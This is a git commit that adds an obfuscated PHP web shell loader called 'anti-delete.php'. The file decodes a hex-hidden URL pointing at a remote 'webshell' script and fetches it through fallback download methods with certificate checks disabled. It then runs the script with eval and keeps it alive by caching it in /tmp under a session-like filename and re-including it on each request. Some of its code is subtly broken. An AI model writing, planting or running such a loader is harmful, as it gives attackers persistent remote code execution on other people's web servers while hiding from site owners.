3dae050a06ee5e5a62206e13081c1bc37b64cee2
hackerman <76028485+exploit-haxor@users.noreply.github.com>
2024-11-10 14:17:42 +0700

    Create anti-delete.php

---
+++ anti-delete.php
@@ -0,0 +1,85 @@
+<?php
+$md5_hashes = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578706c6f69742d6861786f722f7765627368656c6c2f6d61696e2f6d79666b2e706870'; // password : bar ki not
+function hex2str($hex) {
+    $str = '';
+    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
+        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
+    }
+    return $str;
+}
+
+$url = hex2str($md5_hashes);
+
+function downloadWithFileGetContents($url) {
+    if (ini_get('a' . 'llow' . '_ur' . 'l_fo' . 'pe' . 'n')) {
+        return file_get_contents($url);
+    }
+    return false;
+}
+
+function downloadWithCurl($url) {
+    if (function_exists('c' . 'u' . 'rl' . '_i' . 'n' . 'i' . 't')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
+    }
+    return false;
+}
+
+function downloadWithFopen($url) {
+    $result = false;
+    if ($fp = fopen($url, 'r')) {
+        $result = '';
+        while ($data = fread($fp, 8192)) {
+            $result .= $data;
+        }
+        fclose($fp);
+    }
+    return $result;
+}
+
+$phpScript = downloadWithFileGetContents($url);
+if ($phpScript === false) {
+    $phpScript = downloadWithCurl($url);
+}
+if ($phpScript === false) {
+    $phpScript = downloadWithFopen($url);
+}
+
+if ($phpScript === false) {
+    die("lose");
+}
+
+
+eval('?>' . $phpScript);
+
+$TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'; # Jangan Edit bangian sini kalo tidak mau error
+
+function M() {
+	$FGT = @file_get_contents($GLOBALS['hex2str($md5_hashes)']);
+	if(!$FGT) {
+		echo `curl -k $(echo {$GLOBALS['hex2str($md5_hashes)']} | base64 -d) > {$GLOBALS['TMP']}`;
+	} else {
+		$HANDLE = fopen($GLOBALS['TMP'], 'w');
+		fwrite($HANDLE, $FGT);
+		fclose($HANDLE);
+	}
+	echo '<script>window.location="?hari";</script>';
+}
+
+if(file_exists($TMP)) {
+	if(filesize($TMP) === 0) {
+		unlink($TMP);
+		M();
+	} else {
+		include($TMP);
+	}
+} else {
+	M();
+}
+?>
+
